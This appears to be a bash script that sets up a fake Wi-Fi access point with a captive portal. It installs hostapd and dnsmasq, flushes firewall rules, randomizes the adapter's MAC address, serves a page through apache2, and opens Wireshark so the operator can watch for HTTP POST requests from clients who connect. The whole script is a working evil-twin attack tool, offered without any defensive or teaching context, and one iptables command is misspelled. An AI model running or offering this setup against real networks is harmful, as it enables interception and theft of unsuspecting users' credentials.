#! /bin/bash

echo "HEY THERE"


echo "WELCOME TO CAPTIVE_PORTAL_SCRIPT!"
echo  "LET'S PROCEED"
echo  " 1. Lets Download the required softwares for the operation first "

	apt-get update
	apt-get install dnsmasq
	apt-get install hostapd

echo " 2. Now the softwares have been downloaded "
echo " Clearing the iptables "

	echo 1 > /proc/sys/net/ipv4/ip_forward
	iptables --flush
	iptbales --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain


echo " 3. Stopping the network-manager "

	service network-manager stop

echo " 4. Now Moving Forward "
	
echo " Enabling DHCP server and DNS server "

	dnsmasq -C /root/Downloads/fake-ap/dnsmasq.conf

echo "  DONE "

echo " Configuring wlan0 to the ip addresses"

	ifconfig wlan0 up
        ifconfig wlan0	
	ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
	ifconfig wlan0 down 
	macchanger -r wlan0
	ifconfig wlan0 up
	ifconfig wlan0

echo " 5. Enabling hostapd server "

	hostapd /root/Downloads/fake-ap/hostapd.conf -B

echo " 6. and now starting apache2 web server "

	service apache2 start 

echo " 7. Now wait for a while let the clients connect "

echo " Meanwhile"

echo " Opening Wireshark "

echo "Please Look for HTTP request and POST methods "

	wireshark

echo " Thank you "

echo " Good day "

echo " Stopping all the services for you "

	service dnsmasq stop
	service hostapd stop
	service network-manager start 
	service apache2 stop


